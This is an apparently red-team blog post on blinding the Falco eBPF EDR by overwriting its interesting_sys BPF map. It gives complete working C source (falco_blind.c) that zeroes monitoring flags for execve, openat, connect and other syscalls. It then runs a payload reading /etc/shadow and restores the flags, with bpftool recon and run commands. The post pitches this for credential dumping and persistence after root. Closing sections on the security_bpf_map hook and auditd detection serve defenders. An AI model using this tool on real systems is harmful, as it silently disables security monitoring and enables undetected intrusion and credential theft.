---
title: "BPF Map Poisoning: Attacking the EDR from the Inside"
date: 2026-07-06T00:00:00-03:00
description: "Most evasion techniques try to avoid the EDR. This one walks straight into it and writes to its memory."
categories: [Malware]
tags: [EDR Evasion, eBPF, Falco, Linux, Red Team]
author: 0xMatheuZ
draft: false
ShowToc: true
TocOpen: true
UseHugoToc: true
images:
  - "https://i.imgur.com/OGmNt4g.png"
---

![imgur](https://i.imgur.com/0Tyj00A.gif)

Standard EDR evasion is avoidance. Anonymous `mmap` instead of a file, direct syscalls to skip libc hooks, `memfd_create` so `fanotify` never sees a path. Stay out of what the EDR is watching.

BPF Map Poisoning does the opposite: walk into the EDR and rewrite its monitoring state directly.

I use Falco as the demo target because it's open-source and easy to reproduce in a lab. But the issue is architectural: Elastic Defend, Tetragon, any tool that keeps monitoring state in BPF maps without `security_bpf_map` enforcement is in the same position. The demo is Falco; the problem is not.

## How eBPF EDRs actually work

Tools like Falco and Tetragon share the same fundamental design: detection logic runs as eBPF programs inside the kernel. The attachment mechanism varies by tool. Elastic use kprobes or fentry hooks per syscall. Falco attaches to the raw `sys_enter`/`sys_exit` tracepoints, which fire for every syscall through a single hook. Regardless of the mechanism, every time a monitored event fires, the eBPF program runs inside the kernel, inspects the arguments, and decides whether to emit a security alert.

eBPF programs are stateless: no persistent state across invocations without an external store. That store is BPF maps.

BPF maps live in kernel memory and are accessible from both sides. The eBPF program uses helpers like `bpf_map_lookup_elem` and `bpf_map_update_elem`. Userspace uses the `bpf(2)` syscall. That's how the kernel component and the userspace agent communicate.

A typical eBPF EDR maintains maps like these:

| Map name | Type | Purpose |
|---|---|---|
| `interesting_sys` | array[512] | Controls which syscalls are monitored. Index = syscall number, value = 1 (monitor) or 0 (skip) |
| `trusted_pids` | hash | PIDs the EDR should not alert on |
| `syscall_exit_ta` | prog_array | Tail call table that dispatches execution to per-syscall handler programs |
| ring buffer | ringbuf | Kernel-to-userspace event delivery channel |
| `capture_settings` | array | Runtime configuration flags |

These aren't internal-only structures. They're created through the standard `bpf()` syscall and any process with `CAP_BPF` or `CAP_SYS_ADMIN` can open and write to them. That's just how the BPF API works.

## The attack

If the EDR's eBPF program checks an `interesting_sys` array before emitting an alert, and you zero out entries in that array for specific syscalls, the eBPF program will see `0` and return early without generating any event. The EDR keeps running. It still intercepts every syscall. It just silently skips the ones you zeroed in the map.

If the EDR has a `trusted_pids` hash map, inserting your PID into it suppresses all alerts from your process regardless of what syscalls you make. Targeted, but depends on whether that map exists.

The more general approach is zeroing entries in `interesting_sys`. Every process on the system goes unmonitored for those syscalls as long as the entries stay zeroed. More powerful, but at the SIEM level a complete silence on `execve` events is going to look off if anyone has a baseline.

We target `interesting_sys` with a save/blind/restore pass: read the current values, zero them, run the payload, write them back.

## Recon: finding the map IDs

Get the map IDs:

```bash
sudo bpftool map list | grep -E "interesting_sys|syscall_exit_ta"
```

![map recon output](/img/falco-bpf-poison/map-recon.png)

`interesting_sys` is map **155**, `syscall_exit_ta` is map **153**. Those are the IDs we pass to the tool.

For a broader recon when you don't know the map names upfront:

```bash
sudo bpftool map list -j | python3 -c "
import sys, json
for m in json.load(sys.stdin):
    if m.get('type') in ('hash', 'array', 'percpu_hash', 'lru_hash'):
        key = m.get('bytes_key', m.get('key_size', '?'))
        val = m.get('bytes_value', m.get('value_size', '?'))
        print(f\"Map {m['id']}: {m['type']} name={m.get('name','')} key={key}B val={val}B max={m.get('max_entries','?')}\")
"
```

A hash map with `bytes_key=4` and `bytes_value=1` is likely a PID allowlist. An array with `max_entries=512` and `bytes_value=1` is a per-syscall flag table like `interesting_sys`.

Programs and their map references:

```bash
sudo bpftool prog list
# then for each suspicious program:
sudo bpftool prog show id <prog_id>
# Output includes: map_ids 153 155 156 ...
```

Dump `interesting_sys` before touching it:

```bash
sudo bpftool map dump id 155 | head -20
# key: 00 00 00 00
# value: 01          <- syscall 0 (read) monitored
# key: 01 00 00 00
# value: 01          <- syscall 1 (write) monitored
# key: 3b 00 00 00
# value: 01          <- syscall 59 (execve) monitored
```

Every entry with value `01` is an active monitoring rule. Zero it and Falco goes blind for that syscall.

## Falco working normally

Open `/etc/shadow` and watch the alert come in:

![Falco detecting /etc/shadow access with timestamp](/img/falco-bpf-poison/falco-detecting-normal.png)

Left terminal: `cat /etc/shadow` at `16:46:12`. Right terminal: Falco fires `Sensitive file opened for reading` at `16:46:12`.

![Full Falco alert log entry](/img/falco-bpf-poison/falco-alert-detail.png)

`file=/etc/shadow`, `process=cat`, `user_uid=0`, `evt_type=openat`. Now we kill it.

## Syscall suppression with restore: falco_blind.c

`interesting_sys` is a 512-entry array where each index is a syscall number and each value is either `1` (Falco monitors this syscall) or `0` (Falco skips it entirely). When Falco's eBPF program fires on a syscall entry, the first thing it does is look up `interesting_sys[syscall_nr]`. If it gets `0`, it returns immediately without generating any event. The rest of the hook logic, the rule matching, the ring buffer write, none of it runs.

Zero the entries for the syscalls your payload uses and Falco produces nothing for the duration.

Permanently zeroing them works but if anyone's watching event volume, `execve` going silent is a tell. Save the originals, zero the entries, run the payload, restore. Short gap in the timeline instead of a sustained hole.

The syscalls we target:

| Nr | Syscall | Why |
|---|---|---|
| 59 | execve | process execution |
| 322 | execveat | execve variant (fd-relative) |
| 257 | openat | file opens, including /etc/shadow |
| 2 | open | older open() variant |
| 42 | connect | outbound network connections |
| 41 | socket | socket creation |
| 0 | read | file reads |
| 1 | write | file writes |

The tool takes two map IDs as arguments: `interesting_sys` and `syscall_exit_ta`. It opens both file descriptors at startup to fail early if either ID is wrong, but only reads and writes to `interesting_sys`. The `syscall_exit_ta` check is a sanity guard: if you can open it, you have the right Falco instance and the right privilege level.

```c
#define _GNU_SOURCE
#include <linux/bpf.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>

static const uint32_t targets[] = {
    59, 322, 257, 2, 42, 41, 0, 1,
};
#define NTARGETS (sizeof(targets)/sizeof(targets[0]))

#define BPF_ATTR_SZ(last_field) \
    (offsetof(union bpf_attr, last_field) + sizeof(((union bpf_attr *)0)->last_field))

static int bpf_fd(uint32_t id) {
    union bpf_attr a; memset(&a, 0, sizeof(a));
    a.map_id = id;
    return (int)syscall(__NR_bpf, BPF_MAP_GET_FD_BY_ID, &a, BPF_ATTR_SZ(map_id));
}

static int map_lookup(int fd, uint32_t key, void *val) {
    union bpf_attr a; memset(&a, 0, sizeof(a));
    a.map_fd = (uint32_t)fd;
    a.key    = (uint64_t)(uintptr_t)&key;
    a.value  = (uint64_t)(uintptr_t)val;
    return (int)syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &a, BPF_ATTR_SZ(value));
}

static int map_update(int fd, uint32_t key, const void *val) {
    union bpf_attr a; memset(&a, 0, sizeof(a));
    a.map_fd = (uint32_t)fd;
    a.key    = (uint64_t)(uintptr_t)&key;
    a.value  = (uint64_t)(uintptr_t)val;
    a.flags  = BPF_ANY;
    return (int)syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &a, BPF_ATTR_SZ(flags));
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "usage: %s <interesting_sys_id> <syscall_exit_ta_id>\n", argv[0]);
        return 1;
    }

    int fd_isys = bpf_fd((uint32_t)atoi(argv[1]));
    int fd_eta  = bpf_fd((uint32_t)atoi(argv[2]));
    if (fd_isys < 0) { perror("open interesting_sys"); return 1; }
    if (fd_eta  < 0) { perror("open syscall_exit_ta"); return 1; }

    uint8_t saved[NTARGETS];
    uint8_t zero = 0;

    for (size_t i = 0; i < NTARGETS; i++) {
        if (map_lookup(fd_isys, targets[i], &saved[i]) < 0) {
            fprintf(stderr, "[!] lookup failed for syscall %u: %s\n", targets[i], strerror(errno));
            return 1;
        }
        printf("[save]  syscall %3u  original=%u\n", targets[i], saved[i]);
    }

    for (size_t i = 0; i < NTARGETS; i++) {
        map_update(fd_isys, targets[i], &zero);
        printf("[blind] syscall %3u\n", targets[i]);
    }
    printf("[*] Falco blinded for %zu syscalls. Running payload...\n\n", NTARGETS);

    system("/bin/sh -c 'cat /etc/shadow; id; whoami'");

    printf("\n[*] Restoring...\n");
    for (size_t i = 0; i < NTARGETS; i++) {
        if (map_update(fd_isys, targets[i], &saved[i]) == 0)
            printf("[restore] syscall %3u -> %u\n", targets[i], saved[i]);
        else
            fprintf(stderr, "[!] restore failed for syscall %u\n", targets[i]);
    }

    printf("[*] Done. Falco is monitoring again.\n");
    return 0;
}
```

The only map we write to is `interesting_sys`. Falco's eBPF program checks that flag before anything else, so zeroing the entry is enough to short-circuit the entire detection path for that syscall.

```bash
gcc -O2 -o falco_blind falco_blind.c
sudo ./falco_blind 155 153
```

## The gap in Falco's timeline

Left: the payload running at `17:04:02`. `/etc/shadow` fully exposed, `uid=0(root)`, `whoami` returning `root`, restore completing cleanly. Right: Falco's log shows alerts at `16:46:12`, `16:58:19`, `17:01:06`... then nothing at `17:04`. Complete silence.

![falco_blind running, /etc/shadow exposed, no alert in Falco](/img/falco-bpf-poison/blind-no-alert.png)

Falco is still running, eBPF program still attached, still intercepting every syscall. Just not generating anything.

After restore, `cat /etc/shadow` at `17:05:53`:

![Falco detecting again after restore](/img/falco-bpf-poison/falco-restored.png)

Alert at `17:05:53`. Writes restored, Falco back, no restart required.

## Why this works

`bpf(BPF_MAP_UPDATE_ELEM)` is the standard, documented way to write to a BPF map from userspace. This is the exact same call the Falco agent uses to configure the tool at runtime.

Falco's eBPF program has no way to distinguish a legitimate write from an attacker zeroing its monitoring rules. Both go through `BPF_MAP_UPDATE_ELEM` with the same permissions. No signature, no per-map ownership check, nothing in the kernel API that differentiates one caller from the other.

The attacker and the EDR's own agent are indistinguishable at the `bpf(2)` level.

## Privilege requirement

This requires `CAP_BPF` or `CAP_SYS_ADMIN`. The `BPF_MAP_GET_FD_BY_ID` command is a privileged operation unconditionally. The `kernel.unprivileged_bpf_disabled` sysctl controls `BPF_PROG_LOAD` and socket filters, not map management. You need a privileged context regardless: root shell, a process with elevated capabilities, or a prior privesc.

This was tested against Falco running with `engine.kind=modern_ebpf` (`falco-modern-bpf.service`), which is the default on modern kernels with BTF support.

If you already have root on a box running Falco, this lets you move laterally, dump credentials, or install persistence without generating the alerts that would normally follow.

## The `security_bpf_map` LSM hook

The kernel provides a hook that closes this completely: `security_bpf_map`. When a process calls `bpf(BPF_MAP_UPDATE_ELEM)` on a specific map, the kernel invokes `security_bpf_map(map, fmode)` before granting access. An LSM module or BPF LSM program can enforce that only the Falco agent process is allowed to write to Falco's maps. Any other caller gets `-EPERM`.

Check if any LSM BPF programs are loaded before attempting the write:

```bash
sudo bpftool prog list | grep lsm
```

And verify directly whether the write goes through:

```bash
sudo bpftool map update id 155 key hex 3b 00 00 00 value hex 00
# Operation not permitted = security_bpf_map is enforced, maps are protected
# No error = maps are open, technique works
```

Most Falco deployments don't enforce this by default, but check before assuming.

## Forensic trace

The `BPF_MAP_UPDATE_ELEM` call is auditable via `auditd`:

```bash
auditctl -a always,exit -F arch=b64 -S bpf -k bpf_map_write
ausearch -k bpf_map_write
```

The audit record contains the calling process PID and UID and the `bpf()` syscall number, but not the specific map ID being written to. Correlating it with map ownership requires a separate step.

The other signal is the event gap. If your SIEM has a baseline for how many `execve` or `openat` events Falco produces per minute, a window of silence on those event types is worth investigating even if no individual alert fired.

## References

- [Falco source: interesting_sys map definition](https://github.com/falcosecurity/libs)
- [Linux bpf(2) man page](https://man7.org/linux/man-pages/man2/bpf.2.html)
- [kernel/bpf/syscall.c: security_bpf_map hook](https://elixir.bootlin.com/linux/latest/source/kernel/bpf/syscall.c)
- [Tetragon: BPF map access control](https://github.com/cilium/tetragon)
- [bpftool documentation](https://github.com/libbpf/bpftool)
